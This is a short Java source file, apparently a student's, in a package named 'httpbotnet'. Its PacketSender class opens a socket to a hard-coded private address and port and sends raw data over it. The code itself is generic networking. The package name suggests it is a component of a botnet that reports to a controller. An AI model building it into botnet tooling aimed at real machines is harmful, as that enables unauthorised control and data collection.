/*
 * To change this template, choose Tools | Templates
 * and open the template in the editor.
 */
package httpbotnet;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.Socket;
import java.net.UnknownHostException;
import java.util.logging.Level;
import java.util.logging.Logger;

/**
 *
 * @author Student
 */
public class PacketSender {

    private static Socket client;
    public static void init() {
        try {
            if(client==null)
                client = new Socket("192.168.1.19", 9999);
        } catch (UnknownHostException ex) {
            Logger.getLogger(PacketSender.class.getName()).log(Level.SEVERE, null, ex);
        } catch (IOException ex) {
            Logger.getLogger(PacketSender.class.getName()).log(Level.SEVERE, null, ex);
        }
    }
    public static void sendPacket(byte[] data) {
        try {
            PrintWriter pw = new PrintWriter(client.getOutputStream());
            pw.println(new String(data));
            pw.flush();
        } catch (IOException ex) {
            Logger.getLogger(PacketSender.class.getName()).log(Level.SEVERE, null, ex);
        } 
    }
}
